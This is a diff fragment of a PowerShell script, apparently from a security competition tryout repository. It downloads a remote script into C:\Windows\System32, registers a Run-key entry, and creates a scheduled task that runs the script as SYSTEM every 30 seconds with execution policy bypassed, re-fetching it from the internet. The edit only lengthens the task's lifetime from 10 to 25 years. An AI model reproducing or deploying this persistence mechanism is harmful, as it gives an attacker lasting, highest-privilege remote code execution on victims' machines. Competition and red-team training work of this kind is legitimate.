@@ -14,8 +14,7 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Na
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/bits-service.ps1" -OutFile "C:\Windows\System32\bits-service.ps1"
 #Create a scheduled task running the BITS transfer every 30 seconds, redownloading from the internet
 $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ExecutionPolicy Bypass -File C:\Windows\System32\bits-service.ps1'
-$TheDate= ([DateTime]::Now)
-$Duration = (New-TimeSpan -Days 365) * 10
+$Duration = (New-TimeSpan -Days 365) * 25
 $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Seconds 30) -RepetitionDuration $Duration
 $Settings = New-ScheduledTaskSettingsSet
 $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
